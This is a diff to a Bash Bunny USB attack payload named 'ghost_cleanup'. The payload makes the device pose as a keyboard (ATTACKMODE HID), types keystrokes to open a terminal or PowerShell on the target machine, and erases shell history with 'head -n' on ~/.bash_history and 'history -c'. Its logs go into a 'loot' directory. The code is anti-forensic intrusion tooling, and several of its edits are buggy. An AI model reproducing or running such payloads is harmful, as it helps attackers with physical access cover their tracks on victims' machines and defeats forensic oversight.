@@ -18,12 +18,12 @@ LINES=0
 #+++ END CONFIG +++
 
 #if [ $DEBUG==true ]; then
-#    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
-#    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
-#      mkdir /root/udisk/loot
-#      mkdir /root/udisk/loot/ghost_cleanup
-#    fi
-#    touch "${DEBUG_FILE}"
+    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+      mkdir /root/udisk/loot
+      mkdir /root/udisk/loot/ghost_cleanup
+    fi
+    touch "${DEBUG_FILE}"
 #fi
 
 # PLATFORM CHECK
@@ -34,14 +34,15 @@ if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
     LED B
     PLATFORM_COMMAND="powershell"
 else
-    LED R G
+    LED R B
     PLATFORM_COMMAND="terminal"
 fi
 
 # START
-ATTACKMODE HID VID_0X05AC PID_0X021E
+# ATTACKMODE HID VID_0X05AC PID_0X021E
+ATTACKMODE HID
 
-QUACK DELAY 500
+QUACK DELAY 1000
 QUACK ALT F2
 QUACK DELAY 50
 QUACK GUI SPACE
@@ -52,16 +53,20 @@ QUACK DELAY 100
 QUACK STRING "${PLATFORM_COMMAND}"
 QUACK DELAY 200
 QUACK ENTER
-QUACK DELAY 500
+QUACK DELAY 2000
+
 
 # PLATFORM COMMANDS
-if [ "$PLATFORM_COMMAND"=="terminal" ]; then
+if [ "${PLATFORM_COMMAND}"=="terminal" ]; then
 # MAC / LINUX
+    LED RB 100
+
+    echo "${PLATFORM_COMMAND}" > "${LINES}"
+
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
 
-
-    if [ "$LINES" -gt "0" ]; then
-        QUACK STRING head -n -$LINES "~/.bash_history"
+    if [ "${LINES}" -gt "0" ]; then
+        QUACK STRING head -n -"${LINES}" "~/.bash_history"
         QUACK ENTER
         QUACK STRING history -c
         QUACK ENTER
@@ -73,7 +78,9 @@ if [ "$PLATFORM_COMMAND"=="terminal" ]; then
     fi
 else
 # WINDOWS
-    @echo off
+    LED B 100
+    QUACK @echo off
+    QUACK ENTER
     #++ INSERT CUSTOM WINDOWS CLEANUP GOODNESS ++
 
 
